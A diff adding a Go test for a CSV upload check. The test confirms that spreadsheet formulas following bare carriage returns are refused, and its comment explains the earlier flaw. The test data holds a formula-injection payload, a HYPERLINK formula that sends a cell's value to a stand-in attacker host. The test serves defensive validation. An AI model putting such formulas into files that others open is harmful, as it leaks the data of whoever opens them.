@@ -467,6 +467,36 @@ func TestEveryAcceptedFormatHasBoundsAndAVerifier(t *testing.T) {
 	}
 }
 
+// A carriage return ends a line as a line feed does, because a spreadsheet
+// reads one as the end of a row: the classic Mac form of the file, with
+// nothing but carriage returns, is one every spreadsheet still opens.
+//
+// The check read lines only at a line feed, so in that form the whole file
+// was one line, and a formula at the start of every row but the first was
+// in the middle of a cell beginning with the last row's last value. A file
+// a visitor attached to a form, with a formula in any of those places, was
+// accepted, and ran when the site's owner opened it.
+func TestAFormulaAfterACarriageReturnIsRefused(t *testing.T) {
+	formula := `=HYPERLINK("http://evil.example/?"&B2)`
+	for name, body := range map[string]string{
+		"at the start of a row":          "a,b\r" + formula + ",2\r",
+		"after a separator":              "a,b\r1," + formula + "\r",
+		"after a semicolon":              "a;b\r1;" + formula + "\r",
+		"in a quoted cell":               "a,b\r\"" + formula + "\",2\r",
+		"after a carriage return in one": "a,b\r\n1,x\r" + formula + "\r\n",
+	} {
+		if _, err := Accept("data.csv", []byte(body), now); err == nil {
+			t.Errorf("a CSV with a formula %s, in rows ended by carriage returns, was accepted", name)
+		}
+	}
+	// Control: the same file without a formula is taken, in either form.
+	for _, body := range []string{"name,balance\rAda,-4.5\rGrace,12\r", "name,balance\r\nAda,-4.5\r\n"} {
+		if _, err := Accept("data.csv", []byte(body), now); err != nil {
+			t.Errorf("an ordinary CSV was refused: %v\n%q", err, body)
+		}
+	}
+}
+
 // The upload check refuses every cell the exports would guard, and takes
 // a file the records export wrote.
 //
